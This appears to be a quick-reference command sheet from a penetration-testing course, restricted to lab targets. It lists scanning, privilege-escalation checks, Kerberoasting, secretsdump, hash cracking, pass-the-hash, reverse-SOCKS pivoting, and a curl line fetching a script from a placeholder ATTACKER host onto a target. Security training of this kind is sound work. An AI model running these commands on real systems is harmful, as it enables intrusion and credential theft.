# Command &amp; technique reference

A quick-lookup companion, **not a substitute for the lessons** — every command here is explained
(what it does on the wire, options, limits, how to verify) in the module noted. Use it to recall
syntax once you already understand the mechanism.

<div class="callout legal">

LAB TARGETS ONLY. Every command below is for the intentionally vulnerable, isolated lab targets
shipped in this repo or systems you are explicitly authorized to test. `TARGET` = a lab IP/host.

</div>

## Discovery &amp; scanning (M03)

```bash
# Host discovery on a lab subnet (no port scan)
nmap -sn 10.13.0.0/24

# Top-ports TCP SYN scan, service/version detection, default scripts
sudo nmap -sS -sV -sC -p- --min-rate 1000 TARGET -oA scans/target

# UDP is slow and lies — scan a focused set and read results skeptically
sudo nmap -sU --top-ports 50 TARGET

# Verify a "filtered" port by hand
nc -vn TARGET 445
```

## Recon (M02)

```bash
dig +short ANY example.lab @10.13.0.53      # DNS records (lab resolver)
dig axfr example.lab @10.13.0.53            # attempt a zone transfer (often misconfigured)
subfinder -d example.lab -silent            # passive subdomains
ffuf -w wordlist.txt -u https://TARGET/FUZZ # content discovery
```

## Web / API (M07, M08)

```bash
# Raw HTTP is the ground truth
curl -si https://TARGET/                     # headers + body
curl -sk https://TARGET/ -H 'Host: internal' # vhost / smuggling checks

# Directory & parameter fuzzing
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u https://TARGET/FUZZ
feroxbuster -u https://TARGET -w wordlist.txt

# SQLi confirmation (after manual proof)
sqlmap -u 'https://TARGET/item?id=1' --batch --technique=B --level=2
```

## Linux privilege escalation (M04)

```bash
id; sudo -l                                  # who am I, what can I run as root
find / -perm -4000 -type f 2>/dev/null       # SUID binaries
getcap -r / 2>/dev/null                       # file capabilities
cat /etc/crontab; ls -la /etc/cron.*          # scheduled jobs
./linpeas.sh | tee linpeas.txt                # checklist (understand it first)
```

## Windows privilege escalation (M05)

```powershell
whoami /priv                                  # token privileges
Get-Service | Where-Object {$_.StartType -eq 'Automatic'}
# unquoted service paths, weak service ACLs, AlwaysInstallElevated, DLL hijack — see M05
.\winPEASx64.exe
```

## Active Directory (M06, M10, M11)

```bash
# Enumeration (lab DC), using NetExec
nxc smb TARGET -u user -p 'Lab-Passw0rd!' --shares
nxc ldap TARGET -u user -p 'Lab-Passw0rd!' --kerberoasting hashes.txt

# Impacket examples (lab domain)
GetUserSPNs.py lab.local/user:'Lab-Passw0rd!' -dc-ip TARGET -request
GetNPUsers.py lab.local/ -usersfile users.txt -dc-ip TARGET   # AS-REP roasting
secretsdump.py lab.local/user@TARGET                          # after appropriate access

# Graph the environment
bloodhound-python -d lab.local -u user -p 'Lab-Passw0rd!' -c All -ns TARGET
```

## Credentials (M10)

```bash
hashcat -m 1000 ntlm.txt rockyou.txt -r rules/best64.rule     # NTLM
hashcat -m 13100 kerberoast.txt rockyou.txt                   # TGS-REP (Kerberoast)
john --wordlist=rockyou.txt hashes.txt                        # auto-detect format
```

## Lateral movement &amp; pivoting (M11, M12)

```bash
# Pass-the-hash (lab)
nxc smb TARGET -u Administrator -H <NThash>

# Local / remote / dynamic SSH forwarding
ssh -L 8080:internal:80 user@pivot            # local: reach internal:80 via localhost:8080
ssh -R 9001:localhost:9001 user@pivot         # remote: expose your listener on the pivot
ssh -D 1080 user@pivot                        # dynamic: SOCKS proxy on 1080
proxychains nmap -sT -Pn internalTARGET       # route a tool through the SOCKS pivot

# Chisel reverse SOCKS (when SSH isn't available)
./chisel server -p 8000 --reverse             # on attacker
./chisel client ATTACKER:8000 R:socks         # on pivot
```

## Listeners &amp; file transfer (post-exploitation)

```bash
nc -lvnp 4444                                  # catch a callback (lab)
python3 -m http.server 8000                    # serve a file on the attacker box
# on target:
curl http://ATTACKER:8000/linpeas.sh -o /tmp/l.sh
```

More per-topic reference tables live at the end of each lesson. When a command here differs from
your installed tool's behavior, trust the tool and note the difference — see
[`curriculum/maintenance.md`](../curriculum/maintenance.md).
